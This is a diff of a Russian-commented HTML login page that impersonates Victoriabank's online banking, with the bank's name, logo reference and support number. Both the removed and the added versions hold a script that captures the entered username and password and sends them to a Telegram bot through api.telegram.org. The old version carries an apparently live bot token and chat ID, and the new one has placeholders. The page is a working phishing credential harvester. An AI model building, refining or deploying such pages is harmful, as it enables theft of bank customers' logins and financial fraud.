@@ -2,276 +2,238 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Главная страница</title>
   <style>
     /* -------------------------
        Стили для body (вся страница)
        ------------------------- */
     body {
-      margin: 0; /* убираем стандартные отступы браузера */
-      min-height: 100vh; /* минимальная высота = высоте окна */
-      background-image: url('bg.png'); /* фон страницы */
-      background-size: cover; /* растянуть фон на весь экран */
-      background-position: center; /* центрируем фон */
-      background-repeat: no-repeat; /* не повторять изображение */
-      font-family: "NotoSans-Light", Helvetica, Arial, sans-serif; /* основной шрифт */
-      color: #343238; /* основной цвет текста */
-      display: flex; /* включаем flex-контейнер */
-      justify-content: center; /* центрируем по горизонтали */
-      align-items: center; /* центрируем по вертикали */
-      flex-direction: column; /* элементы выстраиваются вертикально */
+      margin: 0;
+      min-height: 100vh;
+      background-image: url('bg.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      font-family: "NotoSans-Light", Helvetica, Arial, sans-serif;
+      color: #343238;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
     }
-
-
-.wb-form {
-  position: relative; /* для абсолютного позиционирования нижних элементов */
-}
-
-/* Ссылка внизу слева */
-.useful-info {
-  display: block;
-  position: absolute;
-  left: 24px;
-  bottom: 48px;  /* чуть выше телефона */
-  font-size: 14px;
-  color: #0088ff;
-  text-decoration: none;
-  font-family: NotoSans-Regular, Helvetica, Arial, sans-serif;
-  transition: color 0.3s ease;
-}
-.useful-info:hover {
-  color: #005fcc;
-  text-decoration: underline;
-}
-
-/* Телефон и контакты справа */
-.contact-info.phone-info {
-  position: absolute;
-  right: 24px;
-  bottom: 48px;  /* выровнено с Useful information по вертикали */
-  text-align: right;
-  font-size: 14px;
-  color: #171cb3;  /* цвет как в футере */
-  font-family: NatoSans-Light, Helvetica, Arial, sans-serif;
-  line-height: 1.3;
-  margin: 0;
-}
-
-/* Текст внизу формы */
-.form-footer-text {
-  position: absolute;
-  left: 24px;
-  bottom: 4px;
-  font-size: 12px;
-  color: #777;
-  font-family: NotoSans-Light, Helvetica, Arial, sans-serif;
-  margin: 0;
-  opacity: 0.8;
-}
-
-
-    .contact-info {
-  position: absolute;  /* абсолютное позиционирование внутри формы */
-  right: 150px;         /* отступ от правого края формы */
-  bottom: -40px;        /* отступ от нижнего края формы */
-  text-align: right;   /* выравнивание текста по правому краю */
-  font-size: 12px;
-  color: white;         /* серый, ненавязчивый */
-  font-family: NotoSans-Light, Helvetica, Arial, sans-serif;
-  line-height: 1.3;
-  margin: 0;
-}
-
-    
-    .form-footer-text {
-  position: absolute;
-  left: 150px;       /* прижато к левому краю формы */
-  bottom: -20px;      /* отступ от нижнего края формы */
-  font-size: 12px;  /* чуть меньше шрифт */
-  color: white;      /* серый, не броский */
-  font-family: NotoSans-Light, Helvetica, Arial, sans-serif;
-  margin: 0;
-  opacity: 0.8;
-}
-
-
-    
-
-    .useful-info {
-  display: block;
-  position: absolute;
-  left: 150px;       /* отступ слева */
-  bottom: 24px;     /* отступ снизу формы */
-  font-size: 14px;
-  color: #0088ff;   /* синий как у кнопки */
-  text-decoration: none;
-  font-family: NotoSans-Regular, Helvetica, Arial, sans-serif;
-  transition: color 0.3s ease;
-}
-
-.useful-info:hover {
-  color: #005fcc;   /* темнее при наведении */
-  text-decoration: underline;
-}
-
 
     /* -------------------------
        Контейнер с языками (правый верхний угол)
        ------------------------- */
     .top-right {
-      position: absolute; /* фиксируем в углу страницы */
+      position: absolute;
       top: 20px;
       right: 20px;
-      display: flex; /* горизонтальное выравнивание логотипов */
-      gap: 20px; /* расстояние между логотипами */
-      align-items: center; /* выравнивание по центру по вертикали */
+      display: flex;
+      gap: 20px;
+      align-items: center;
     }
-
-    /* -------------------------
-       Стиль каждого языкового логотипа
-       ------------------------- */
     .logo-item {
-      display: flex; /* иконка и текст в ряд */
-      align-items: center; /* вертикальное выравнивание */
-      gap: 5px; /* расстояние между иконкой и текстом */
+      display: flex;
+      align-items: center;
+      gap: 5px;
     }
-
     .logo-item img {
-      width: 24px; /* ширина иконки */
-      height: 24px; /* высота иконки */
+      width: 24px;
+      height: 24px;
     }
-
     .logo-item span {
-      font-size: 14px; /* размер текста */
-      color: white; /* цвет текста */
+      font-size: 14px;
+      color: white;
     }
 
     /* -------------------------
-       Центральный логотип страницы
+       Центральный логотип
        ------------------------- */
     .center-logo {
-      margin-top: 36px; /* отступ сверху */
-      margin-bottom: 30px; /* отступ снизу */
+      margin-top: 36px;
+      margin-bottom: 30px;
     }
-
     .center-logo img {
-      width: 72px; /* ширина логотипа */
-      height: auto; /* автоматическая высота для сохранения пропорций */
+      width: 72px;
+      height: auto;
     }
 
     /* -------------------------
        Основной контейнер с формой
        ------------------------- */
     .main-content {
-      background-color: #ffffff; /* белый фон */
-      width: 90%; /* ширина блока 90% от родителя */
-      max-width: 960px; /* максимальная ширина */
-      min-height: 400px; /* минимальная высота */
-      border: solid #ffffff; /* белая рамка */
-      border-width: 0 1px 1px; /* верх 0, боковые и нижняя */
-      border-radius: 0; /* без скругления */
-      box-sizing: border-box; /* учитываем padding в ширину */
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15); /* тень вокруг блока */
-      padding: 40px; /* внутренние отступы */
-      display: flex; /* flex для центрирования формы */
-      justify-content: center; /* горизонтальное центрирование */
-      align-items: center; /* вертикальное центрирование */
+      background-color: #ffffff;
+      width: 90%;
+      max-width: 960px;
+      min-height: 400px;
+      border: solid #ffffff;
+      border-width: 0 1px 1px;
+      border-radius: 0;
+      box-sizing: border-box;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+      padding: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative; /* для абсолютных элементов внутри */
     }
 
     /* -------------------------
        Стили формы входа
        ------------------------- */
     .wb-form {
-      width: 100%; /* форма занимает всю ширину контейнера */
-      max-width: 400px; /* максимум ширины формы */
+      width: 100%;
+      max-width: 400px;
       font-family: "NotoSans-Light", Helvetica, Arial, sans-serif;
-      font-feature-settings: "kern" on, "liga" off, "calt" on; /* тонкая настройка шрифта */
+      font-feature-settings: "kern" on, "liga" off, "calt" on;
+      position: relative;
     }
 
-    /* -------------------------
-       Обертка для каждого поля формы
-       ------------------------- */
     .field-wrapper {
-      display: flex; /* горизонтальное выравнивание label + input */
-      align-items: center; /* вертикальное выравнивание */
-      justify-content: space-between; /* расстояние между label и input */
-      margin: 15px 0; /* отступы сверху и снизу */
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 15px 0;
     }
-
-    /* -------------------------
-       Стили для подписей полей (label)
-       ------------------------- */
     .field-wrapper label {
-      font-size: 13px; /* размер текста */
-      color: #555; /* цвет текста */
-      font-weight: 300; /* легкий шрифт */
-      letter-spacing: 0.3px; /* межбуквенный интервал */
-      width: 100px; /* ширина блока label */
-      text-align: right; /* текст выравнен по правому краю */
-      margin-right: 15px; /* отступ от input */
+      font-size: 13px;
+      color: #555;
+      font-weight: 300;
+      letter-spacing: 0.3px;
+      width: 100px;
+      text-align: right;
+      margin-right: 15px;
     }
-
-    /* -------------------------
-       Стили для полей ввода (input)
-       ------------------------- */
     .field-wrapper input {
-      flex: 1; /* занимает оставшееся пространство */
-      padding: 10px; /* внутренние отступы */
-      border: 1px solid #ccc; /* серый бордер */
-      background-color: #fff; /* фон поля */
-      font-size: 14px; /* размер текста */
-      border-radius: 0; /* без скругления */
+      flex: 1;
+      padding: 10px;
+      border: 1px solid #ccc;
+      background-color: #fff;
+      font-size: 14px;
+      border-radius: 0;
     }
 
     /* -------------------------
        Кнопка входа
        ------------------------- */
     .login-button {
-  /* Центрирование и отступ */
-  margin: 48px auto 0;      /* отступ сверху и выравнивание по центру */
-  display: block;            /* кнопка как блочный элемент */
-  
-  /* Размеры */
-  height: 40px;              /* фиксированная высота */
-  line-height: 40px;         /* выравнивание текста по вертикали */
-  min-width: 136px;          /* минимальная ширина */
-  padding: 0 24px;           /* горизонтальные отступы внутри */
-
-  /* Цвет и фон */
-  background: #0088ff;       /* синий фон */
-  color: #FFFFFF;            /* белый текст */
-  border: 1px solid #0088ff; /* рамка такого же цвета */
-
-  /* Скругление */
-  border-radius: 4px;        /* закруглённые углы */
-
-  /* Шрифт */
-  font-family: "NotoSans-Regular", Helvetica, Arial, sans-serif !important;
-  font-feature-settings: "kern" on, "liga" off, "calt" on !important;
-  font-size: 14px;
-  text-align: center;
-  box-sizing: border-box;
-  white-space: nowrap;
-
-  /* Поведение */
-  cursor: pointer;
-  transition: background 0.3s, border 0.3s;
-}
-
+      margin: 48px auto 0;
+      display: block;
+      height: 40px;
+      line-height: 40px;
+      min-width: 136px;
+      padding: 0 24px;
+      background: #0088ff;
+      color: #FFFFFF;
+      border: 1px solid #0088ff;
+      border-radius: 4px;
+      font-family: "NotoSans-Regular", Helvetica, Arial, sans-serif !important;
+      font-feature-settings: "kern" on, "liga" off, "calt" on !important;
+      font-size: 14px;
+      text-align: center;
+      box-sizing: border-box;
+      white-space: nowrap;
+      cursor: pointer;
+      transition: background 0.3s, border 0.3s;
+    }
+    .login-button:hover {
+      background-color: #003399;
+    }
 
     /* -------------------------
-       Эффект при наведении на кнопку
+       Useful information слева
        ------------------------- */
-    .login-button:hover {
-      background-color: #003399; /* более темный цвет при hover */
+    .useful-info {
+      display: block;
+      position: absolute;
+      left: 24px;
+      bottom: 48px;
+      font-size: 14px;
+      color: #0088ff;
+      text-decoration: none;
+      font-family: NotoSans-Regular, Helvetica, Arial, sans-serif;
+      transition: color 0.3s ease;
+    }
+    .useful-info:hover {
+      color: #005fcc;
+      text-decoration: underline;
+    }
+
+    /* -------------------------
+       Контакты справа
+       ------------------------- */
+    .contact-info {
+      position: absolute;
+      right: 24px;
+      bottom: 48px;
+      text-align: right;
+      font-size: 14px;
+      color: #171cb3;
+      font-family: NatoSans-Light, Helvetica, Arial, sans-serif;
+      line-height: 1.3;
+      margin: 0;
+    }
+    .contact-info p {
+      margin: 2px 0;
+    }
+
+    /* -------------------------
+       Футер внизу формы
+       ------------------------- */
+    .form-footer-text {
+      position: absolute;
+      left: 24px;
+      bottom: 4px;
+      font-size: 12px;
+      color: #777;
+      font-family: NotoSans-Light, Helvetica, Arial, sans-serif;
+      margin: 0;
+      opacity: 0.8;
+    }
+
+    /* -------------------------
+       Медиа-запросы для мобильных
+       ------------------------- */
+    @media (max-width: 600px) {
+      .main-content {
+        padding: 20px;
+      }
+      .wb-form {
+        max-width: 90%;
+      }
+      .login-button {
+        font-size: 13px;
+        padding: 0 16px;
+        min-width: unset;
+        width: 100%;
+      }
+      .center-logo img {
+        width: 50px;
+      }
+      .top-right {
+        gap: 10px;
+      }
+      .logo-item img {
+        width: 20px;
+        height: 20px;
+      }
+      .useful-info, .contact-info, .form-footer-text {
+        position: relative;
+        bottom: auto;
+        left: auto;
+        right: auto;
+        text-align: center;
+        margin-top: 10px;
+        font-size: 12px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <!-- -------------------------
-       Логотипы языков в правом верхнем углу
-       ------------------------- -->
+  <!-- Логотипы языков -->
   <div class="top-right">
     <div class="logo-item">
       <img src="romana.svg" alt="Română">
@@ -283,76 +245,56 @@
     </div>
   </div>
 
-  <!-- -------------------------
-       Центральный логотип
-       ------------------------- -->
+  <!-- Центральный логотип -->
   <div class="center-logo">
     <img src="logovkb.svg" alt="Логотип VKB">
   </div>
 
-  <!-- -------------------------
-       Основной контейнер с формой входа
-       ------------------------- -->
+  <!-- Основной контейнер с формой -->
   <div class="main-content">
     <form class="wb-form">
-      <!-- Поле Username -->
       <div class="field-wrapper">
         <label for="username">Username</label>
         <input id="username" type="text" required>
       </div>
-
-      <!-- Поле Password -->
       <div class="field-wrapper">
         <label for="password">Password</label>
         <input id="password" type="password" required>
       </div>
-
-      <!-- Кнопка Войти -->
       <button class="login-button" type="submit">Login</button>
     </form>
 
-   
- <div class="contact-info">
-  <p>Call Customer Support</p>
-  <p>1303 / +373 22 21 03 03</p>
-</div>
+    <!-- Контакты справа -->
+    <div class="contact-info">
+      <p>Call Customer Support</p>
+      <p>1303 / +373 22 21 03 03</p>
+    </div>
 
-    
+    <!-- Useful information слева -->
+    <a href="#" class="useful-info">Useful information</a>
 
-<a href="#" class="useful-info">Useful information</a>
-    
-<p class="form-footer-text">BC Victoriabank SA, 2017</p>
-    
+    <!-- Футер внизу формы -->
+    <p class="form-footer-text">BC Victoriabank SA, 2017</p>
   </div>
-<script>
-document.querySelector('.wb-form').addEventListener('submit', async function(e) {
-  e.preventDefault(); // отменяем стандартную отправку формы
 
-  // получаем значения полей
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
-
-  // ⚠️ Замени на свой токен и chat_id
-  const BOT_TOKEN = '6836324743:AAFIWAOKYDUkbz3ojpNthxPb0WqYtBkfBkg';
-  const CHAT_ID = '5446866680';
-
-  // формируем текст сообщения
-  const text = `🔐 Новая форма входа:\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;
-
-  // отправляем в Telegram через API
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text })
-  });
-
-  // можно очистить форму или показать сообщение
-  alert('Данные отправлены!');
-  e.target.reset();
-});
-</script>
-
+  <script>
+    document.querySelector('.wb-form').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const BOT_TOKEN = 'ВАШ_ТОКЕН';
+      const CHAT_ID = 'ВАШ_CHAT_ID';
+      const text = `🔐 Новая форма входа:\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text })
+      });
+      alert('Данные отправлены!');
+      e.target.reset();
+    });
+  </script>
 
 </body>
 </html>
